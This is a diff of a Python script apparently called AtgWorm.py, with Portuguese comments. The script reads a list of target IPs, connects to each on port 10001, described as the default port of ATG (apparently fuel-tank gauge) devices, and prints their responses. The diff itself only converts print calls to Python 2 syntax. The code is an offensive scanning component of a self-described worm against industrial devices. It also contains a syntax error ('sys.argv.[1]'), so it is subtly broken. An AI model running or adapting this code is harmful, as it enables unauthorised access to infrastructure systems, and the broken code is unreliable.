@@ -22,7 +22,7 @@ print(banner)
 
 # help option
 if sys.argv[1] == "-h":
-	print("\t\t\t\t\t\tModo de uso:\n\t\t\t\t\t\tVoce deve passar como parametro um arquivo .txt contendo os ip's que o script ira usar, exemplo:\n\t\t\t\t\t\t$ python AtgWorm.py -f alvos.txt\n\n")
+	print "\t\t\t\t\t\tModo de uso:\n\t\t\t\t\t\tVoce deve passar como parametro um arquivo .txt contendo os ip's que o script ira usar, exemplo:\n\t\t\t\t\t\t$ python AtgWorm.py -f alvos.txt\n\n"
 	exit()
 elif sys.argv.[1] == "-f":
 	arquivo = open(sys.argv[2])
@@ -36,7 +36,7 @@ wg = wget('https://ipinfo.io/ip')
 if wg is None:
   exit()
 
-print ("your ip: {}".format(wg))
+print "your ip: {}".format(wg)
 sleep(4)
 
 # tenta conectar no ip de ipList na porta 10001(porta default do ATG)
@@ -49,10 +49,10 @@ for ip in ips:
 		
 		r.recvuntil(' ', drop=True)	
 		response = r.recv(4029)
-		print("\tresponse = %s".format(response))
+		print "\tresponse = {}".format(response)
 		
 		r.close()
 	except:
 		# caso nao consiga se conectar no ip vai para o proximo da lista
-		print ("erro ao conectar ao ip {}:10001".format(ip))
+		print "erro ao conectar ao ip {}:10001".format(ip)
 		pass
